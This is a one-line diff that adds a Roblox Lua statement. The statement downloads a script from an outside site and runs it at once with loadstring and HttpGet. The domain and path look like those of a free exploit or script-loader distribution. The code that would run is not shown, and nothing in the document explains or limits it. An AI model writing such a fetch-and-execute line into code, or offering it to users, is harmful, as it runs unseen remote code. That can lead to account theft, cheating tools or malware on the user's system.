@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://www.byteforge-getnow.space/luashieldfree/J3MWgR0wvXDs.lua",true))()
